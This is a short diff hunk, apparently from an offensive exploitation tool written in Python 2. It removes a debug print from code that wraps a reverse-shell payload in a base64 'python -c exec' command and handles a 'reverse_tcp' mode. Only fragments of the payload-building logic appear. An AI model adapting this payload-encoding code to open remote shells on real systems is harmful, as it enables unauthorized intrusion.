@@ -157,7 +157,6 @@ exec(d,{'s':s})"""
         other_shell = settings.WIN_PYTHON_DIR + "python.exe -c \"exec('" +other_shell+ "'.decode('base64'))\""
       else:
         other_shell = "python -c \"exec('" +other_shell+ "'.decode('base64'))\""
-        print other_shell
       break
     elif other_shell.lower() == "reverse_tcp": 
       print Fore.YELLOW + "(^) Warning: You are already into the 'reverse_tcp' mode." + Style.RESET_ALL 
